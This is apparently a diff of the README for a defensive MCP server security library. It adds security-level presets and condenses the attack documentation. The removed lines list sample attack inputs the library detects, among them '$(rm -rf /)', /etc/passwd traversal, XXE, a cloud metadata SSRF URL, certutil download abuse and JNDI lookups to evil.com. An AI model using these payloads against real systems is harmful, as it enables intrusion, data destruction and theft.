@@ -26,9 +26,10 @@ import { SecureMcpServer } from 'mcp-secure-server';
 import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
 import { z } from 'zod';
 
-// Create secure server (drop-in replacement for McpServer)
+// Create secure server with a security preset
 const server = new SecureMcpServer(
-  { name: 'my-server', version: '1.0.0' }
+  { name: 'my-server', version: '1.0.0' },
+  { securityLevel: 'standard' }  // 'basic' | 'standard' | 'paranoid' | 'custom'
 );
 
 // Register tools exactly like McpServer
@@ -45,12 +46,53 @@ const transport = new StdioServerTransport();
 await server.connect(transport);
 ```
 
+### Security Presets
+
+Choose your security level with a single option:
+
+```typescript
+// Development: relaxed limits, minimal validation
+const devServer = new SecureMcpServer(
+  { name: 'dev', version: '1.0.0' },
+  { securityLevel: 'basic' }
+);
+
+// Production: balanced security (default)
+const prodServer = new SecureMcpServer(
+  { name: 'prod', version: '1.0.0' },
+  { securityLevel: 'standard' }
+);
+
+// High-security: maximum protection
+const secureServer = new SecureMcpServer(
+  { name: 'secure', version: '1.0.0' },
+  { securityLevel: 'paranoid' }
+);
+
+// Custom: override specific values within a preset
+const customServer = new SecureMcpServer(
+  { name: 'custom', version: '1.0.0' },
+  {
+    securityLevel: 'standard',
+    maxRequestsPerMinute: 60  // Override just this value
+  }
+);
+```
+
+| Preset | Use Case | Message Size | Rate Limit | Content Validation |
+|--------|----------|--------------|------------|-------------------|
+| `basic` | Development, testing | 100KB | 120/min | Minimal (critical only) |
+| `standard` | Production (default) | 50KB | 30/min | Standard patterns |
+| `paranoid` | High-risk, compliance | 25KB | 15/min | Full (381 patterns) |
+| `custom` | Full control | You decide | You decide | You decide |
+
 ### With Logging (Opt-in)
 
 ```typescript
 const server = new SecureMcpServer(
   { name: 'my-server', version: '1.0.0' },
   {
+    securityLevel: 'standard',
     enableLogging: true,
     verboseLogging: true,
     logPerformanceMetrics: true,
@@ -169,22 +211,9 @@ Validates the fundamental structure of incoming JSON-RPC messages.
 
 Detects and blocks malicious content patterns in request parameters.
 
-**Protections:**
-- Path traversal (`../../../etc/passwd`)
-- Command injection (`$(rm -rf /)`, backticks, pipes)
-- SQL injection (`' OR 1=1; DROP TABLE users; --`)
-- NoSQL injection (`{"$where": "..."}`)
-- XSS (`<script>alert('xss')</script>`)
-- Prototype pollution (`{"__proto__": {...}}`)
-- XML entity attacks (XXE, Billion Laughs)
-- CRLF injection (`\r\n\r\n` header injection)
-- SSRF (cloud metadata endpoints)
-- CSV injection (formula injection)
-- LOLBins (certutil, mshta, regsvr32)
-- GraphQL introspection attacks
-- Deserialization attacks (Java, PHP, Python, .NET, Ruby)
-- JNDI/Log4Shell (`${jndi:ldap://...}`)
-- Buffer overflow patterns
+**Protections:** Path traversal, command injection, SQL/NoSQL injection, XSS, prototype pollution, XML entity attacks (XXE), CRLF injection, SSRF, CSV injection, LOLBins, GraphQL introspection, deserialization attacks, JNDI/Log4Shell, buffer overflow patterns, and more.
+
+See [SECURITY.md](./SECURITY.md#attack-vectors) for the complete list of 200+ attack patterns with examples.
 
 **Configuration:**
 ```typescript
@@ -1112,35 +1141,13 @@ See [SECURITY.md](./SECURITY.md) for full security documentation including:
 
 ## Attack Coverage
 
-### Blocked Attacks (Examples)
+The framework detects and blocks 200+ attack patterns across 19 categories including injection attacks, path traversal, SSRF, deserialization, and more.
 
-| Attack Type | Example Input | Detection |
-|------------|---------------|-----------|
-| Path Traversal | `../../../etc/passwd` | `PATH_TRAVERSAL` |
-| Command Injection | `$(rm -rf /)` | `COMMAND_INJECTION` |
-| SQL Injection | `' OR 1=1; DROP TABLE users; --` | `SQL_INJECTION` |
-| XSS | `<script>alert('xss')</script>` | `XSS_ATTEMPT` |
-| Prototype Pollution | `{"__proto__": {"admin": true}}` | `PROTOTYPE_POLLUTION` |
-| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | `XML_ENTITY_ATTACK` |
-| Billion Laughs | `<!DOCTYPE lolz [<!ENTITY lol...` | `XML_ENTITY_ATTACK` |
-| CRLF Injection | `\r\n\r\nHTTP/1.1 200 OK` | `CRLF_INJECTION` |
-| NoSQL Injection | `{"$where": "this.password == ''"}` | `NOSQL_INJECTION` |
-| SSRF | `http://169.254.169.254/latest/` | `SSRF_ATTEMPT` |
-| CSV Injection | `=HYPERLINK("http://evil.com")` | `CSV_INJECTION` |
-| LOLBins | `certutil -urlcache -split -f` | `LOLBIN_ABUSE` |
-| GraphQL Introspection | `{__schema{types{name}}}` | `GRAPHQL_INTROSPECTION` |
-| Java Deserialization | `rO0ABXNy...` | `DESERIALIZATION_ATTACK` |
-| PHP Deserialization | `O:8:"stdClass":0:{}` | `DESERIALIZATION_ATTACK` |
-| JNDI/Log4Shell | `${jndi:ldap://evil.com/a}` | `JNDI_INJECTION` |
-
-### Allowed Operations (Examples)
-
-| Operation | Input | Result |
-|-----------|-------|--------|
-| Calculator | `25 * 4` | `100` |
-| File Reader | `./data/config.json` | File contents |
-| Echo | `Hello World` | `Echo: Hello World` |
-| Database Query | `SELECT name FROM users WHERE id = 1` | Query result |
+See [SECURITY.md](./SECURITY.md#attack-vectors) for the complete threat model with:
+- Attack vectors and examples
+- Severity levels and detection layers
+- Mitigation strategies
+- Violation type reference
 
 ## Error Handling
 
